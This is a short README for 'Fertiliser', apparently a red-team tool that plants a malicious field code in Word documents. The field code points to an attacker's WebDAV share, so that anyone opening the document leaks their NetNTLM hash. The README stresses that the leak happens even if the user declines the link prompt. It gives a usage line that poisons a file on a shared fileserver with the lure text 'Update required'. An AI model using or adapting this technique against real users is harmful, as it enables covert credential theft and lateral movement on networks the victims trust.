# Fertiliser
Author: @domchell

Fertiliser is a project to poison office documents (current only docx) with a malicious field code that points to a WebDav share.
When the user opens the document, they will inadvertently leak their NetNTLM hash to Farmer.

One thing to be aware of is once the document is poisoned, it will trigger a prompt to the user stating that the document contains links.
Regardless of whether the user selects to open the link, the hash will still be leaked.

Usage:
```
Fertiliser.exe <Path> <WebDAV Path> <Field Comment>
Example: Fertiliser.exe \\fileserver\important.docx http://workstation:8888/foo "Update required"
```